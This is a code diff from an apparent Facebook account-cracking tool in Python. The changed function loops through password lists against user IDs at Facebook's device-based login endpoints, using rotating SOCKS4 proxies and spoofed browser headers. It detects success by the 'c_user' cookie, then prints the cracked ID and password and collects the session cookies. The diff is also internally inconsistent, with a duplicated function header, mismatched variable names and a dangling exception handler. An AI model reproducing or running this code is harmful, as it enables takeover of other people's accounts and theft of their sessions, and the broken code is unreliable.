@@ -1335,7 +1335,7 @@ def ffb6(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 		
-def crack(idf,pwv):
+def ffb6(ids,names,passlist):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	sys.stdout.write(f"\r{bo} [BLADE-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
@@ -1346,14 +1346,26 @@ def crack(idf,pwv):
 	for pw in pwv:
 		try:
 			nip=random.choice(prox)
-			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({"Host":'p.facebook.com','upgrade-insecure-requests': '1','user-agent':ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]**[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',"dnt":"1",'x-requested-with': 'XMLHttpRequest','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','referer': 'https://mbasic.facebook.com/',"accept-encoding":"gzip, deflate br",'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',})
-			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
-			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0',"accept-encoding":"gzip, deflate br",'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','origin': 'https://p.facebook.com','referer': 'https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-asbd-id': '198387','x-fb-lsd': 'AVokZHZJEcA','x-requested-with': 'XMLHttpRequest','x-response-format': 'JSONStream','user-agent': ua})
-			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict().keys():
-		    
+			head = {'Host': 'www.facebook.com','viewport-width': '980',
+ 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+ 'sec-ch-ua-mobile': '?0',
+ 'sec-ch-ua-platform': '"Windows"',
+ 'sec-ch-prefers-color-scheme': 'light',
+ 'dnt': '1', 
+ 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+ 'upgrade-insecure-requests': '1', 
+ 'user-agent': ua, 
+ 'sec-fetch-site': 'none',
+ 'sec-fetch-mode': 'navigate',
+ 'sec-fetch-user': '?1', 
+ 'sec-fetch-dest': 'document',
+ 'accept-encoding': 'gzip, deflate, br',
+ 'accept-language': 'en-US,en;q=0.9',}
+			getlog = session.get(f'https://www.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+			complete = session.post('https://www.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+			AXI=session.cookies.get_dict().keys()
+			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
@@ -1370,6 +1382,10 @@ def crack(idf,pwv):
 					break
 			else:
 				continue
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	loop+=1
+
 	
 def menu_apikey():  
   uuid = str(os.geteuid()) + str(os.getlogin()) + str(os.getlogin()) +str(os.geteuid())
